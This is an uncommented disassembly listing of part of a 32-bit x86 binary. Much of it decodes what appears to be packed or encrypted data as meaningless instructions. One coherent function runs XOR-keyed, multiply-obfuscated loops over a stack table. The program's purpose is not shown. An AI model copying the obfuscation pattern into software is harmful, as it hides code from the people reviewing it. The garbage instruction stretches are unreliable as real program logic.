  4118b9:	jae    0x4118aa
  4118bb:	mov    edx,0x9e19a3d
  4118c0:	push   cs
  4118c1:	jno    0x4118a1
  4118c3:	add    al,0xea
  4118c5:	daa    
  4118c6:	or     BYTE PTR [esi-0x3cc4ca0],dh
  4118cc:	xchg   ebp,eax
  4118cd:	dec    edi
  4118ce:	inc    esi
  4118cf:	push   edx
  4118d0:	and    DWORD PTR [ecx-0x10],ecx
  4118d3:	stc    
  4118d4:	adc    edx,0x2dbfbd25
  4118da:	fcmovnb st,st(5)
  4118dc:	das    
  4118dd:	loope  0x4118df
  4118df:	aas    
  4118e0:	ds xchg edi,eax
  4118e2:	bound  eax,QWORD PTR [esi]
  4118e4:	or     al,0x31
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	jecxz  0x41189f
  4118e9:	cmp    DWORD PTR [edx-0x2d909941],esi
  4118ef:	int    0x8b
  4118f1:	fiadd  DWORD PTR [eax]
  4118f3:	dec    edx
  4118f4:	jge    0x4118f9
  4118f6:	adc    eax,0xfa561115
  4118fb:	push   edi
  4118fc:	mov    ch,BYTE PTR [ebx]
  4118fe:	xchg   esi,eax
  4118ff:	mov    ch,0x42
  411901:	stos   DWORD PTR es:[edi],eax
  411902:	cmp    esp,DWORD PTR [edi]
  411904:	jmp    0x411958
  411906:	mov    edi,0xbf1d1a0d
  41190b:	scas   al,BYTE PTR es:[edi]
  41190c:	inc    edi
  41190d:	adc    esp,DWORD PTR [edx+0x3189f862]
  411913:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411914:	xchg   ebx,eax
  411915:	daa    
  411916:	mov    ds:0xba925182,al
  41191b:	pop    edx
  41191c:	call   DWORD PTR [esi]
  41191e:	dec    esp
  41191f:	cmp    BYTE PTR [eax+0x68820c4e],bl
  411925:	(bad)  [edx+eax*2-0x9]
  411929:	scas   al,BYTE PTR es:[edi]
  41192a:	inc    ebx
  41192b:	dec    eax
  41192c:	call   0x5da:0x4fe51f51
  411933:	int    0xf6
  411935:	inc    eax
  411936:	sub    DWORD PTR [edx+edi*1+0x47],0x38
  41193b:	shl    DWORD PTR [ebx],1
  41193d:	in     eax,dx
  41193e:	xor    edi,DWORD PTR [edi+0x3298347d]
  411944:	mov    bl,0xd3
  411946:	pop    edx
  411947:	jge    0x4118d3
  411949:	adc    eax,0xde811fb8
  41194e:	xor    ebp,DWORD PTR [ebp+0x77]
  411951:	jecxz  0x411936
  411953:	mov    BYTE PTR [edx+eiz*1-0x3d79d13c],dh
  41195a:	mov    eax,ds:0x9f9321f0
  41195f:	repz fild DWORD PTR [eax-0x57a79d65]
  411966:	pop    edi
  411967:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411968:	or     al,0xab
  41196a:	push   es
  41196b:	xor    al,0xbc
  41196d:	das    
  41196e:	fs cmc 
  411970:	and    DWORD PTR [eax],0x43
  411973:	adc    DWORD PTR [ebx+eiz*8-0x3],esi
  411977:	adc    al,0xd
  411979:	add    cl,BYTE PTR [edx]
  41197b:	mov    ds:0x36eaa9a1,al
  411980:	iret   
  411981:	pop    edi
  411982:	mov    esi,0x1e48823a
  411987:	or     al,0xf9
  411989:	mov    al,ds:0xce97c597
  41198e:	sbb    eax,0xeaf9dc9c
  411993:	ins    BYTE PTR es:[edi],dx
  411994:	dec    esp
  411995:	lods   eax,DWORD PTR ds:[esi]
  411996:	cmc    
  411997:	inc    esi
  411998:	push   cs
  411999:	xor    esp,ecx
  41199b:	xor    edx,DWORD PTR [edx]
  41199d:	adc    BYTE PTR [edi-0x2f],ch
  4119a0:	daa    
  4119a1:	or     edi,esi
  4119a3:	(bad)  
  4119a4:	xchg   ecx,eax
  4119a5:	cmp    al,0x7
  4119a7:	mov    ds:0x61ccba82,al
  4119ac:	xor    eax,0x5b92eec5
  4119b1:	mov    edi,0x91c7657
  4119b6:	xor    BYTE PTR [edx-0x65],ch
  4119b9:	mov    edx,0xd46fea53
  4119be:	loope  0x4119a5
  4119c0:	push   esp
  4119c1:	inc    eax
  4119c2:	outs   dx,BYTE PTR ds:[esi]
  4119c3:	push   edi
  4119c4:	sub    DWORD PTR [eax-0x5],edi
  4119c7:	inc    edi
  4119c8:	jmp    0x4f2a:0xd0b7d19f
  4119cf:	ror    BYTE PTR [esi-0xd],cl
  4119d2:	sub    eax,0x34d7cea2
  4119d7:	pop    esi
  4119d8:	aas    
  4119d9:	sbb    ebx,DWORD PTR [esp+ecx*2+0x31c3e05]
  4119e0:	jb     0x411a20
  4119e2:	mov    dl,0x52
  4119e4:	scas   al,BYTE PTR es:[edi]
  4119e5:	push   ds
  4119e6:	adc    al,0x55
  4119e8:	push   edx
  4119e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119ea:	adc    DWORD PTR fs:[ebx+eax*2-0x36],edi
  4119ef:	inc    esi
  4119f0:	mov    eax,0xd6fd2dea
  4119f5:	mov    ch,0x33
  4119f7:	push   esi
  4119f8:	stc    
  4119f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119fa:	adc    al,0xf1
  4119fc:	inc    ebp
  4119fd:	pop    ebp
  4119fe:	push   ebx
  4119ff:	push   ds
  411a00:	mov    ecx,0x4efa28ef
  411a05:	dec    ecx
  411a06:	mov    al,ds:0x962575b1
  411a0b:	repnz mov ah,0xae
  411a0e:	mov    esi,0x87412cd5
  411a13:	or     DWORD PTR [edi+0x60],ebp
  411a16:	jnp    0x411a5b
  411a18:	cli    
  411a19:	out    dx,eax
  411a1a:	mov    ebp,0x2aeccb94
  411a1f:	pop    esi
  411a20:	dec    edx
  411a21:	les    ebp,FWORD PTR [edi+0x2a92cac9]
  411a27:	in     eax,dx
  411a28:	test   BYTE PTR [esi],cl
  411a2a:	dec    ecx
  411a2b:	ja     0x4119e6
  411a2d:	mov    esi,0xa99505ca
  411a32:	jg     0x4119fe
  411a34:	sub    esp,edx
  411a36:	out    dx,al
  411a37:	push   esp
  411a38:	test   al,0x1e
  411a3a:	jge    0x411ab5
  411a3c:	inc    edi
  411a3d:	pop    edi
  411a3e:	xlat   BYTE PTR ds:[ebx]
  411a3f:	int3   
  411a40:	mov    ch,0x81
  411a42:	popa   
  411a43:	mov    bh,0xe6
  411a45:	lods   al,BYTE PTR ds:[esi]
  411a46:	out    dx,al
  411a47:	dec    ebx
  411a48:	jg     0x411a5e
  411a4a:	cli    
  411a4b:	dec    edi
  411a4c:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a4e:	popf   
  411a4f:	xchg   edi,eax
  411a50:	jae    0x411a6d
  411a52:	jge    0x411aa0
  411a54:	cli    
  411a55:	sub    ecx,DWORD PTR [edx+esi*1]
  411a58:	xchg   esp,eax
  411a59:	push   esp
  411a5a:	inc    esp
  411a5b:	push   ss
  411a5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a5d:	mov    ah,0xe8
  411a5f:	xor    al,0xd7
  411a61:	std    
  411a62:	jno    0x411a7f
  411a64:	icebp  
  411a65:	sar    DWORD PTR [edi+0x48],0x8b
  411a69:	mov    ch,0x44
  411a6b:	mov    al,ds:0x4bc7f1eb
  411a70:	sub    DWORD PTR [esi],0xffffff94
  411a73:	fdiv   QWORD PTR [ebp+0x3ff34699]
  411a79:	sbb    ebp,esp
  411a7b:	(bad)  
  411a7c:	bound  esi,QWORD PTR [esi]
  411a7e:	clc    
  411a7f:	xchg   BYTE PTR [ebx+0x36],ch
  411a82:	sub    al,0xd1
  411a84:	mov    ch,0xbe
  411a86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a87:	stc    
  411a88:	jecxz  0x411a2a
  411a8a:	push   esi
  411a8b:	clc    
  411a8c:	ret    0x3a6b
  411a8f:	xor    bl,BYTE PTR ds:[ebp-0x7a]
  411a93:	push   edx
  411a94:	pusha  
  411a95:	outs   dx,BYTE PTR ds:[esi]
  411a96:	and    al,cl
  411a98:	fild   DWORD PTR [ebx]
  411a9a:	in     eax,0xff
  411a9c:	mov    ebp,0x5a1ed846
  411aa1:	(bad)  
  411aa2:	mov    edx,DWORD PTR [esi]
  411aa4:	mov    gs,WORD PTR [ecx+eax*8]
  411aa7:	mov    cl,0xa6
  411aa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411aaa:	aas    
  411aab:	adc    DWORD PTR [eax],0x95df4e49
  411ab1:	inc    esp
  411ab2:	xchg   ebp,eax
  411ab3:	mov    ds:0xc7e086d3,eax
  411ab8:	pop    ss
  411ab9:	aam    0x44
  411abb:	scas   al,BYTE PTR es:[edi]
  411abc:	and    ch,BYTE PTR [ecx+0x3a6e524]
  411ac2:	pop    ebp
  411ac3:	mov    ds:0x1b3053e9,al
  411ac8:	xchg   esp,eax
  411ac9:	test   DWORD PTR [ebp-0x34],0x9cd98653
  411ad0:	sbb    cl,0x1c
  411ad3:	inc    esp
  411ad4:	push   cs
  411ad5:	push   eax
  411ad6:	xor    DWORD PTR [edi+0x75fb06b9],edx
  411adc:	icebp  
  411add:	stc    
  411ade:	fwait
  411adf:	cmc    
  411ae0:	enter  0x602f,0x2f
  411ae4:	repz xchg edi,eax
  411ae6:	adc    DWORD PTR [ebp+0x7a],eax
  411ae9:	lahf   
  411aea:	call   0xbc845ab7
  411aef:	push   esp
  411af0:	adc    al,0x73
  411af2:	leave  
  411af3:	pusha  
  411af4:	sbb    ch,ah
  411af6:	into   
  411af7:	mov    edi,0x312bb0a3
  411afc:	aaa    
  411afd:	or     eax,edx
  411aff:	xor    BYTE PTR [eax],al
  411b01:	mov    ch,0x8e
  411b03:	mov    esi,0x4d25086f
  411b08:	pop    edi
  411b09:	mov    dl,0x8f
  411b0b:	ret    0xf8f7
  411b0e:	pop    ds
  411b0f:	mov    ah,0x58
  411b11:	jns    0x411b02
  411b13:	lods   al,BYTE PTR ds:[esi]
  411b14:	add    al,0xba
  411b16:	out    0xd0,al
  411b18:	aaa    
  411b19:	jecxz  0x411ad0
  411b1b:	sahf   
  411b1c:	push   ebx
  411b1d:	adc    eax,ebp
  411b1f:	mov    esi,0xdb87cc29
  411b24:	les    eax,FWORD PTR [edx+0x57c27711]
  411b2a:	pop    esi
  411b2b:	adc    esi,DWORD PTR [eax+0x6dec706]
  411b31:	das    
  411b32:	(bad)  
  411b33:	out    0x9f,eax
  411b35:	jmp    0x89bd4076
  411b3a:	outs   dx,DWORD PTR ds:[esi]
  411b3b:	mov    esi,0x60d8ece2
  411b40:	bound  eax,QWORD PTR [eax+0x8]
  411b43:	mov    esi,0x3729fc59
  411b48:	imul   ecx,DWORD PTR [esi-0x4c],0xdda469ed
  411b4f:	jnp    0x411bbf
  411b51:	out    dx,al
  411b52:	lock test al,0x32
  411b55:	sub    al,0xae
  411b57:	jmp    0x411b03
  411b59:	dec    ecx
  411b5a:	push   eax
  411b5b:	jb     0x411b4f
  411b5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b5e:	je     0x411b0e
  411b60:	leave  
  411b61:	mov    bl,0xfb
  411b63:	lods   al,BYTE PTR fs:[esi]
  411b65:	or     edi,DWORD PTR [esp+eiz*4]
  411b68:	rol    BYTE PTR [ebp-0x75],0xc4
  411b6c:	xlat   BYTE PTR ds:[ebx]
  411b6d:	xchg   ebp,eax
  411b6e:	cmp    al,0x5a
  411b70:	sahf   
  411b71:	xor    ecx,esp
  411b73:	data16 stos BYTE PTR es:[edi],al
  411b75:	pop    edx
  411b76:	mov    edi,0xee38a0ab
  411b7b:	push   0x61
  411b7d:	mov    esi,0xca8f1dde
  411b82:	xchg   edi,eax
  411b83:	add    DWORD PTR [esp+ecx*4-0x165ce7e7],esi
  411b8a:	sbb    al,BYTE PTR [esi+0x71]
  411b8d:	jns    0x411b4f
  411b8f:	mov    al,0x12
  411b91:	iret   
  411b92:	mov    ah,0x83
  411b94:	shr    BYTE PTR [ebp-0x3d],1
  411b97:	mov    ds:0xc4843418,eax
  411b9c:	scas   al,BYTE PTR es:[edi]
  411b9d:	mov    bl,0xf6
  411b9f:	in     al,0xa7
  411ba1:	repz adc al,0xed
  411ba4:	xchg   ebp,eax
  411ba5:	push   esp
  411ba6:	(bad)  
  411ba7:	lds    ecx,FWORD PTR [ecx-0x3f]
  411baa:	xor    DWORD PTR [esp+ecx*2+0x47],esp
  411bae:	xchg   ebx,eax
  411baf:	add    al,0x6c
  411bb1:	shl    DWORD PTR [ebx+ebx*4-0x2e589041],0x2c
  411bb9:	neg    DWORD PTR [edx-0x6abc3f53]
  411bbf:	ss push esi
  411bc1:	leave  
  411bc2:	jl     0x411c31
  411bc4:	mov    dl,0x87
  411bc6:	sbb    eax,0x891e2875
  411bcb:	pop    ds
  411bcc:	outs   dx,BYTE PTR ds:[esi]
  411bcd:	push   0x7f
  411bcf:	lahf   
  411bd0:	test   al,0x5f
  411bd2:	sti    
  411bd3:	lods   al,BYTE PTR ds:[esi]
  411bd4:	hlt    
  411bd5:	mov    dh,0x51
  411bd7:	xor    ebx,DWORD PTR [eax]
  411bd9:	cmp    DWORD PTR [eax+0xb40b848],ecx
  411bdf:	inc    edx
  411be0:	ret    0x949b
  411be3:	jle    0x411c4a
  411be5:	cwde   
  411be6:	jmp    0x6fac:0x1a56dacb
  411bed:	retf   
  411bee:	gs dec eax
  411bf0:	lods   eax,DWORD PTR ds:[esi]
  411bf1:	xlat   BYTE PTR ds:[ebx]
  411bf2:	pop    es
  411bf3:	cmp    al,0xd1
  411bf5:	adc    BYTE PTR ds:0xf96883b6,bl
  411bfb:	inc    ecx
  411bfc:	pop    edi
  411bfd:	cdq    
  411bfe:	dec    edx
  411bff:	aad    0xce
  411c01:	dec    eax
  411c02:	inc    esp
  411c03:	cld    
  411c04:	aaa    
  411c05:	int3   
  411c06:	(bad)  
  411c07:	rcr    BYTE PTR [esi],0xfc
  411c0a:	sub    BYTE PTR [eax],dh
  411c0c:	fst    DWORD PTR [edx-0x2e]
  411c0f:	sbb    bl,BYTE PTR [ebp+0xf726825]
  411c15:	adc    DWORD PTR [edx+eiz*1+0x5af078e4],esp
  411c1c:	(bad)  
  411c1d:	div    DWORD PTR [ecx]
  411c1f:	xor    al,0x17
  411c21:	xor    bh,BYTE PTR [ebx]
  411c23:	adc    dl,al
  411c25:	stos   DWORD PTR es:[edi],eax
  411c26:	call   0xe001f7e6
  411c2b:	out    0x27,al
  411c2d:	stos   DWORD PTR es:[edi],eax
  411c2e:	and    ebp,edx
  411c30:	repz je 0x411ca3
  411c33:	cmp    BYTE PTR [eax],al
  411c35:	adc    esi,esp
  411c37:	pop    ecx
  411c38:	push   0xffffff9c
  411c3a:	call   0xb74a365e
  411c3f:	mov    ebx,0x73439673
  411c44:	fist   DWORD PTR [esi]
  411c46:	daa    
  411c47:	xchg   ebx,eax
  411c48:	cmp    eax,0x1e5e3bdc
  411c4d:	cmp    ch,BYTE PTR [ecx]
  411c4f:	scas   al,BYTE PTR es:[edi]
  411c50:	mov    eax,ds:0x1ea33731
  411c55:	mov    bh,0x51
  411c57:	stos   DWORD PTR es:[edi],eax
  411c58:	mov    al,ds:0xf539352d
  411c5d:	push   ss
  411c5e:	sub    edx,DWORD PTR [ebx+0x56d4c13d]
  411c64:	adc    BYTE PTR [ecx+ebp*2+0x4],dh
  411c68:	out    dx,al
  411c69:	gs dec eax
  411c6b:	xchg   edx,eax
  411c6c:	clc    
  411c6d:	ret    
  411c6e:	repnz add al,BYTE PTR [edi+0x6d793162]
  411c75:	jae    0x411cf5
  411c77:	dec    edi
  411c78:	adc    DWORD PTR [esi],0xf66a5c7e
  411c7e:	pop    edi
  411c7f:	mul    DWORD PTR [edx]
  411c81:	pop    es
  411c82:	popa   
  411c83:	ret    
  411c84:	adc    DWORD PTR [ebp-0x220bd79f],ecx
  411c8a:	lock test ebx,esi
  411c8d:	push   ss
  411c8e:	imul   esp,ebx,0x7d82a75b
  411c94:	mov    eax,ds:0x5cb3238a
  411c99:	les    ebp,FWORD PTR [edi-0x1b145abc]
  411c9f:	inc    eax
  411ca0:	or     al,0xb1
  411ca2:	xor    al,0xc5
  411ca4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ca5:	pop    esi
  411ca6:	repnz bound ebp,QWORD PTR [ebx]
  411ca9:	jecxz  0x411c4c
  411cab:	loop   0x411cbd
  411cad:	call   0xb924ddab
  411cb2:	xchg   esp,eax
  411cb3:	pop    edx
  411cb4:	push   edi
  411cb5:	cmp    BYTE PTR [edi+0x59fd89f8],ch
  411cbb:	lea    ecx,[edx]
  411cbd:	xchg   edi,eax
  411cbe:	mov    ds:0x3ba50b39,eax
  411cc3:	pop    ss
  411cc4:	bound  esp,QWORD PTR [ebp-0x3]
  411cc7:	pop    ecx
  411cc8:	push   esp
  411cc9:	mov    ebx,0x2f51f33f
  411cce:	repz xchg edx,eax
  411cd0:	sub    al,0xa3
  411cd2:	push   ecx
  411cd3:	mov    eax,ds:0xf3241029
  411cd8:	stc    
  411cd9:	and    eax,0x23cf1a9d
  411cde:	into   
  411cdf:	jg     0x411c84
  411ce1:	sub    edi,DWORD PTR [ecx+edx*8-0x49e204b0]
  411ce8:	jns    0x411cf3
  411cea:	arpl   WORD PTR [esi],si
  411cec:	in     eax,dx
  411ced:	add    BYTE PTR [ecx-0x42],bh
  411cf0:	and    BYTE PTR [ebx+0x3101c23a],0xb5
  411cf7:	(bad)  
  411cf8:	hlt    
  411cf9:	and    eax,0x2ec16889
  411cfe:	cmp    eax,0x2438037f
  411d03:	enter  0xafb7,0xa3
  411d07:	fisttp QWORD PTR [edi]
  411d09:	jno    0x411ce5
  411d0b:	push   edx
  411d0c:	ret    0x4390
  411d0f:	fnstcw WORD PTR [ecx+0xe]
  411d12:	dec    eax
  411d13:	jbe    0x411cbf
  411d15:	push   esi
  411d16:	fld    TBYTE PTR [ebx]
  411d18:	ins    BYTE PTR es:[edi],dx
  411d19:	imul   esp,ebp,0xffffffd4
  411d1c:	sbb    al,ch
  411d1e:	mov    ds:0xf9c8b6ae,eax
  411d23:	add    eax,0xcda50644
  411d28:	retf   
  411d29:	adc    dh,BYTE PTR [edx+0x52]
  411d2c:	and    eax,0x97a8477e
  411d31:	pop    edi
  411d32:	cwde   
  411d33:	mov    eax,0x1134c592
  411d38:	adc    eax,0x9987fe2e
  411d3d:	mov    cl,0x13
  411d3f:	mov    BYTE PTR [esi+0x40],ch
  411d42:	xchg   eax,esp
  411d44:	outs   dx,DWORD PTR ds:[esi]
  411d45:	ss iret 
  411d47:	push   0xdfbb8fb0
  411d4c:	add    ecx,DWORD PTR [edx+0x7b392ab]
  411d52:	out    0xec,al
  411d54:	int    0xbc
  411d56:	in     eax,dx
  411d57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d58:	push   ebx
  411d59:	xacquire xchg BYTE PTR ds:0x8aa16bcf,bh
  411d60:	jbe    0x411da7
  411d62:	popf   
  411d63:	push   ecx
  411d64:	out    0xdd,eax
  411d66:	jle    0x411de4
  411d68:	xor    al,0x1c
  411d6a:	int3   
  411d6b:	jmp    0xa7d2e30a
  411d70:	ds adc eax,0x5eea5905
  411d76:	fs icebp 
  411d78:	(bad)  
  411d79:	pushf  
  411d7a:	and    al,BYTE PTR [ecx]
  411d7c:	jl     0x411db5
  411d7e:	or     eax,0xd35bec8e
  411d83:	pop    edx
  411d84:	ds je  0x411d48
  411d87:	pop    esp
  411d88:	rcl    DWORD PTR [edi+0x9efc340],1
  411d8e:	sbb    dl,BYTE PTR [eax+0xad17cc0]
  411d94:	ins    DWORD PTR es:[edi],dx
  411d95:	scas   eax,DWORD PTR es:[edi]
  411d96:	nop
  411d97:	shl    DWORD PTR [esi+0x74],0x1a
  411d9b:	xchg   BYTE PTR [eax],dh
  411d9d:	int    0x5e
  411d9f:	inc    esi
  411da0:	xchg   edx,eax
  411da1:	cmp    ecx,edx
  411da3:	jb     0x40f9d0
  411da9:	jmp    0x411df3
  411dae:	mov    ecx,DWORD PTR [ebp-0xc]
  411db1:	mov    DWORD PTR [ebp+0x8],ecx
  411db4:	jmp    0x411de6
  411db9:	mov    ecx,DWORD PTR [ebp+0x8]
  411dbc:	mov    edx,DWORD PTR [ebp-0x8]
  411dbf:	xor    ecx,eax
  411dc1:	xor    edx,eax
  411dc3:	sub    ecx,edx
  411dc5:	sub    ecx,esi
  411dc7:	xor    ecx,eax
  411dc9:	mov    DWORD PTR [ebp+0x8],ecx
  411dcc:	mov    ecx,DWORD PTR [ebp+0x8]
  411dcf:	mov    edx,DWORD PTR [ebp+0x8]
  411dd2:	imul   edx,edx,0x5708f2
  411dd8:	xor    ecx,eax
  411dda:	add    ecx,esi
  411ddc:	lea    ecx,[ebp+ecx*4-0x64]
  411de0:	mov    edi,DWORD PTR [ecx]
  411de2:	add    edx,edi
  411de4:	mov    DWORD PTR [ecx],edx
  411de6:	mov    ecx,DWORD PTR [ebp+0x8]
  411de9:	xor    ecx,eax
  411deb:	add    ecx,esi
  411ded:	jne    0x411db9
  411df3:	mov    ecx,DWORD PTR [ebp-0xc]
  411df6:	mov    DWORD PTR [ebp+0x8],ecx
  411df9:	jmp    0x411e2b
  411dfe:	mov    ecx,DWORD PTR [ebp+0x8]
  411e01:	mov    edx,DWORD PTR [ebp-0x8]
  411e04:	xor    ecx,eax
  411e06:	xor    edx,eax
  411e08:	sub    ecx,edx
  411e0a:	sub    ecx,esi
  411e0c:	xor    ecx,eax
  411e0e:	mov    DWORD PTR [ebp+0x8],ecx
  411e11:	mov    ecx,DWORD PTR [ebp+0x8]
  411e14:	mov    edx,DWORD PTR [ebp+0x8]
  411e17:	imul   edx,edx,0x5708f2
  411e1d:	xor    ecx,eax
  411e1f:	add    ecx,esi
  411e21:	lea    ecx,[ebp+ecx*4-0x64]
  411e25:	mov    edi,DWORD PTR [ecx]
  411e27:	add    edx,edi
  411e29:	mov    DWORD PTR [ecx],edx
  411e2b:	mov    ecx,DWORD PTR [ebp+0x8]
  411e2e:	xor    ecx,eax
  411e30:	add    ecx,esi
  411e32:	jne    0x411dfe
  411e38:	mov    ecx,DWORD PTR [ebp-0x8]
  411e3b:	mov    edx,DWORD PTR [ebp-0x20]
  411e3e:	xor    ecx,eax
  411e40:	lea    ecx,[ecx+edx*1+0x3272dd]
  411e47:	mov    DWORD PTR [ebp-0x20],ecx
  411e4a:	inc    DWORD PTR [ebp+0xc]
  411e4d:	mov    ecx,DWORD PTR [ebp-0x1c]
  411e50:	xor    ecx,eax
  411e52:	add    ecx,esi
  411e54:	jne    0x40f7af
  411e5a:	jmp    0x411ee3
  411e5f:	mov    ecx,DWORD PTR [ebp-0xc]
  411e62:	mov    DWORD PTR [ebp+0x8],ecx
  411e65:	jmp    0x411e97
  411e6a:	mov    ecx,DWORD PTR [ebp+0x8]
  411e6d:	mov    edx,DWORD PTR [ebp-0x8]
  411e70:	xor    ecx,eax
  411e72:	xor    edx,eax
  411e74:	sub    ecx,edx
  411e76:	sub    ecx,esi
  411e78:	xor    ecx,eax
  411e7a:	mov    DWORD PTR [ebp+0x8],ecx
  411e7d:	mov    ecx,DWORD PTR [ebp+0x8]
  411e80:	mov    edx,DWORD PTR [ebp+0x8]
  411e83:	imul   edx,edx,0x5708f2
  411e89:	xor    ecx,eax
  411e8b:	add    ecx,esi
  411e8d:	lea    ecx,[ebp+ecx*4-0x64]
  411e91:	mov    edi,DWORD PTR [ecx]
  411e93:	add    edx,edi
  411e95:	mov    DWORD PTR [ecx],edx
  411e97:	mov    ecx,DWORD PTR [ebp+0x8]
  411e9a:	xor    ecx,eax
  411e9c:	add    ecx,esi
  411e9e:	jne    0x411e6a
  411ea4:	jmp    0x411eef
  411ea9:	mov    ecx,DWORD PTR [ebp+0x8]
  411eac:	mov    edx,DWORD PTR [ebp-0x8]
  411eaf:	xor    ecx,eax
  411eb1:	xor    edx,eax
  411eb3:	sub    ecx,edx
  411eb5:	sub    ecx,esi
  411eb7:	xor    ecx,eax
  411eb9:	mov    DWORD PTR [ebp+0x8],ecx
  411ebc:	mov    ecx,DWORD PTR [ebp+0x8]
  411ebf:	mov    edx,DWORD PTR [ebp+0x8]
  411ec2:	xor    ecx,eax
  411ec4:	imul   edx,edx,0x5708f2
  411eca:	add    ecx,esi
  411ecc:	lea    ecx,[ebp+ecx*4-0x64]
  411ed0:	mov    edi,DWORD PTR [ecx]
  411ed2:	add    edx,edi
  411ed4:	mov    DWORD PTR [ecx],edx
  411ed6:	mov    ecx,DWORD PTR [ebp+0x8]
  411ed9:	xor    ecx,eax
  411edb:	add    ecx,esi
  411edd:	jne    0x411ea9
  411ee3:	mov    ecx,DWORD PTR [ebp-0x8]
  411ee6:	xor    ecx,eax
  411ee8:	mov    eax,DWORD PTR [ebp+0x10]
  411eeb:	add    ecx,esi
  411eed:	mov    DWORD PTR [eax],ecx
  411eef:	pop    edi
  411ef0:	pop    esi
  411ef1:	pop    ebx
  411ef2:	leave  
  411ef3:	ret    0xc
	...
  411f02:	add    BYTE PTR [eax],al
  411f04:	pop    esi
  411f05:	mov    eax,0x4dd0
  411f0a:	add    BYTE PTR [eax],al
  411f0c:	xor    bl,BYTE PTR [edi]
  411f0e:	add    DWORD PTR [eax],eax
  411f10:	add    DWORD PTR [eax],eax
  411f12:	add    BYTE PTR [eax],al
  411f14:	add    DWORD PTR [eax],eax
  411f16:	add    BYTE PTR [eax],al
  411f18:	add    DWORD PTR [eax],eax
  411f1a:	add    BYTE PTR [eax],al
  411f1c:	sub    BYTE PTR [edi],bl
  411f1e:	add    DWORD PTR [eax],eax
  411f20:	sub    al,0x1f
  411f22:	add    DWORD PTR [eax],eax
  411f24:	xor    BYTE PTR [edi],bl
  411f26:	add    DWORD PTR [eax],eax
  411f28:	test   eax,0x3e000029
  411f2d:	pop    ds
  411f2e:	add    DWORD PTR [eax],eax
  411f30:	add    BYTE PTR [eax],al
  411f32:	push   ebx
  411f33:	jns    0x411fa2
  411f35:	bound  ebp,QWORD PTR [edi+0x6c]
  411f38:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  411f3f:	inc    ebx
  411f40:	ins    BYTE PTR es:[edi],dx
  411f41:	outs   dx,DWORD PTR ds:[esi]
  411f42:	jae    0x411fa9
  411f44:	push   edi
  411f45:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  411f4c:	popa   
  411f4d:	je     0x411fb8
  411f4f:	outs   dx,DWORD PTR ds:[esi]
  411f50:	outs   dx,BYTE PTR ds:[esi]
  411f51:	inc    ebx
  411f52:	ins    BYTE PTR es:[edi],dx
  411f53:	outs   dx,DWORD PTR ds:[esi]
  411f54:	jae    0x411fbb
  411f56:	push   edi
  411f57:	imul   eax,DWORD PTR [eax],0x40042a0
  411f5d:	mov    al,ds:0xa0080042
  411f62:	inc    edx
  411f63:	add    BYTE PTR [eax+eiz*4],cl
  411f66:	inc    edx
  411f67:	add    BYTE PTR [eax],dl
  411f69:	mov    al,ds:0xa0140042
  411f6e:	inc    edx
  411f6f:	add    BYTE PTR [eax],bl
  411f71:	mov    al,ds:0xa01c0042
  411f76:	inc    edx
  411f77:	add    BYTE PTR [eax],al
  411f79:	rol    BYTE PTR [edx+0x0],1
  411f7c:	add    al,0xd0
  411f7e:	inc    edx
  411f7f:	add    BYTE PTR [eax],cl
  411f81:	rol    BYTE PTR [edx+0x0],1
  411f84:	or     al,0xd0
  411f86:	inc    edx
  411f87:	add    BYTE PTR [eax],dl
  411f89:	rol    BYTE PTR [edx+0x0],1
  411f8c:	adc    al,0xd0
  411f8e:	inc    edx
  411f8f:	add    BYTE PTR [eax],bl
  411f91:	rol    BYTE PTR [edx+0x0],1
  411f94:	sbb    al,0xd0
  411f96:	inc    edx
	...
  411fa3:	add    BYTE PTR [esi-0x48],bl
  411fa6:	ror    BYTE PTR [ebp+0x0],1
  411fa9:	add    BYTE PTR [eax],al
  411fab:	add    BYTE PTR [edx],al
  411fad:	add    BYTE PTR [eax],al
  411faf:	add    BYTE PTR ds:0x30000000,bh
  411fb5:	and    BYTE PTR [ecx],al
  411fb7:	add    BYTE PTR [eax],dh
  411fb9:	adc    al,0x1
  411fbb:	add    BYTE PTR [eax],al
  411fbd:	nop
  411fbe:	inc    edx
  411fbf:	add    BYTE PTR [eax+edx*4],al
  411fc2:	inc    edx
  411fc3:	add    BYTE PTR [eax],cl
  411fc5:	nop
  411fc6:	inc    edx
  411fc7:	add    BYTE PTR [eax+edx*4],cl
  411fca:	inc    edx
  411fcb:	add    BYTE PTR [eax],dl
  411fcd:	nop
  411fce:	inc    edx
  411fcf:	add    BYTE PTR [eax+edx*4],dl
  411fd2:	inc    edx
  411fd3:	add    BYTE PTR [eax],bl
  411fd5:	nop
  411fd6:	inc    edx
  411fd7:	add    BYTE PTR [eax+edx*4],bl
  411fda:	inc    edx
  411fdb:	add    BYTE PTR [eax],ah
  411fdd:	nop
  411fde:	inc    edx
  411fdf:	add    BYTE PTR [eax+edx*4],ah
  411fe2:	inc    edx
  411fe3:	add    BYTE PTR [eax],ch
  411fe5:	nop
  411fe6:	inc    edx
  411fe7:	add    BYTE PTR [eax],al
  411fe9:	mov    al,0x42
  411feb:	add    BYTE PTR [eax+esi*4],al
  411fee:	inc    edx
  411fef:	add    BYTE PTR [eax],cl
  411ff1:	mov    al,0x42
  411ff3:	add    BYTE PTR [eax+esi*4],cl
  411ff6:	inc    edx
  411ff7:	add    BYTE PTR [eax],dl
  411ff9:	mov    al,0x42
  411ffb:	add    BYTE PTR [eax+esi*4],dl
  411ffe:	inc    edx
  411fff:	add    BYTE PTR [eax],bl
  412001:	mov    al,0x42
  412003:	add    BYTE PTR [eax+esi*4],bl
  412006:	inc    edx
  412007:	add    BYTE PTR [eax],al
  412009:	rol    BYTE PTR [edx+0x0],0x4
